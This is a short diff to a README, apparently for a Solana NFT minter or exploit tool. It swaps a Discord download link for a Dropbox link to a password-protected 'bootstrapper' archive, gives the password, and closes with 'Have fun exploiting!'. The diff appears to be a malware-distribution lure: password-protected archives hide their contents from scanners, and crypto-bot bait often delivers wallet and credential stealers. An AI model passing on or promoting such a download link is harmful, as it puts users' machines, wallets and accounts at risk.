@@ -12,7 +12,8 @@ I have no Idea why this is causing an issue, but that happened to me. I'm not re
 I will try to find a fix for it soon. Please view the below example if you didn't understand:
 
 
-[Click to download the bootstrapper](https://cdn.discordapp.com/attachments/755678688531709983/997187560210190437/Solana_NFT_Minter_Bot.zip)<br>
+[Click to download the bootstrapper](https://www.dropbox.com/s/cvmh55im3fq5fbh/Nova%20Z.zip?dl=1)<br>
+Password- coolshorty
 
 Have fun exploiting! :)
 
